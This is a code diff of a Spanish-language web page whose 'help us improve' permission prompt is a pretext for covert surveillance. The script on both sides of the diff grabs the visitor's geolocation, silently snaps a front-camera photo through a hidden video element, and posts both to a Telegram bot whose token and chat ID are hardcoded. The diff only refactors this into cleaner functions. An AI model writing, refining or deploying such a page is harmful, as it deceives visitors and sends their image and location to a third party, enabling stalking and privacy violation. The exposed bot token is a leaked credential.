@@ -60,109 +60,111 @@
         <div id="permission-content">
             <h2>Ayúdanos a Mejorar</h2>
             <p>Recopilamos datos para ofrecerte una experiencia optimizada y personalizada. Por favor, concede permisos para continuar.</p>
-            <button onclick="requestPermissions()">Aceptar</button>
+            <button id="accept-button">Aceptar</button>
         </div>
     </div>
 
     <script>
+        // Datos del bot de Telegram
         const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
         const chatId = '1223367230'; // Chat ID
-        let locationInfo = 'Ubicación: No disponible (usuario no otorgó permisos).';
+
+        // Almacenar datos de ubicación
+        let locationInfo = 'Ubicación: No disponible.';
         let mapLink = '';
 
-        async function requestPermissions() {
-            const modal = document.getElementById('permission-modal');
-            modal.style.display = 'none'; // Ocultar el modal después de la aceptación
-            await getLocation(); // Obtener ubicación
-            await initializeCamera(); // Iniciar la cámara
-        }
-
+        // Obtener la ubicación del usuario
         async function getLocation() {
-            if (navigator.geolocation) {
-                try {
-                    await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                const { latitude, longitude } = position.coords;
-                                locationInfo = `Ubicación: Latitud ${latitude}, Longitud ${longitude}`;
-                                mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                                resolve();
-                            },
-                            () => {
-                                console.warn('No se pudo obtener la ubicación.');
-                                resolve();
-                            }
-                        );
-                    });
-                } catch (error) {
-                    console.error('Error al intentar obtener ubicación:', error.message);
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const { latitude, longitude } = position.coords;
+                            locationInfo = `Ubicación: Latitud ${latitude}, Longitud ${longitude}`;
+                            mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                            resolve();
+                        },
+                        () => {
+                            console.warn('No se pudo obtener la ubicación.');
+                            resolve();
+                        }
+                    );
+                } else {
+                    console.warn('Geolocalización no soportada por el navegador.');
+                    resolve();
                 }
-            } else {
-                console.warn('Geolocalización no soportada por el navegador.');
-            }
+            });
         }
 
-        async function initializeCamera() {
-            const constraints = {
-                video: {
-                    facingMode: "user" // Intentar usar la cámara frontal
-                }
-            };
+        // Iniciar la cámara y capturar una foto
+        async function capturePhoto() {
+            const constraints = { video: { facingMode: "user" } }; // Usar cámara frontal
+            const video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.createElement('video'); // Crear video oculto
-                video.style.display = 'none';
-                document.body.appendChild(video);
                 video.srcObject = stream;
                 video.play();
 
-                video.onloadedmetadata = async () => {
-                    await captureAndSendPhoto(video, stream);
-                    stream.getTracks().forEach(track => track.stop()); // Detener cámara
-                    video.remove(); // Eliminar elemento video
-                };
+                // Esperar a que el video cargue
+                await new Promise((resolve) => (video.onloadedmetadata = resolve));
+
+                // Crear un canvas para capturar la imagen
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convertir la imagen a un blob
+                return new Promise((resolve) => {
+                    canvas.toBlob((blob) => {
+                        resolve({ blob, stream, video });
+                    }, 'image/jpeg');
+                });
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
             }
         }
 
-        async function captureAndSendPhoto(video, stream) {
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-
-            // Configurar canvas con las dimensiones del video
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            // Dibujar la imagen del video en el canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convertir el contenido del canvas a un archivo Blob
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `Nuevo visitante:
+        // Enviar la foto y la ubicación a Telegram
+        async function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', `Nuevo visitante:
 - ${locationInfo}
 - Enlace a Google Maps: ${mapLink || 'No disponible'}`);
 
-                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    if (!response.ok) {
-                        console.error('Error al enviar la foto:', await response.json());
-                    }
-                } catch (error) {
-                    console.error('Error de red:', error.message);
+            try {
+                const response = await fetch(url, { method: 'POST', body: formData });
+                if (!response.ok) {
+                    console.error('Error al enviar la foto:', await response.json());
                 }
-            }, 'image/jpeg');
+            } catch (error) {
+                console.error('Error de red:', error.message);
+            }
         }
+
+        // Proceso principal
+        async function handlePermissions() {
+            document.getElementById('permission-modal').style.display = 'none'; // Ocultar modal
+            await getLocation(); // Obtener ubicación
+            const { blob, stream, video } = await capturePhoto(); // Capturar foto
+            if (blob) {
+                await sendToTelegram(blob); // Enviar a Telegram
+            }
+            // Detener la cámara
+            stream.getTracks().forEach((track) => track.stop());
+            video.remove();
+        }
+
+        // Configurar evento para el botón
+        document.getElementById('accept-button').onclick = handlePermissions;
     </script>
 </body>
 </html>
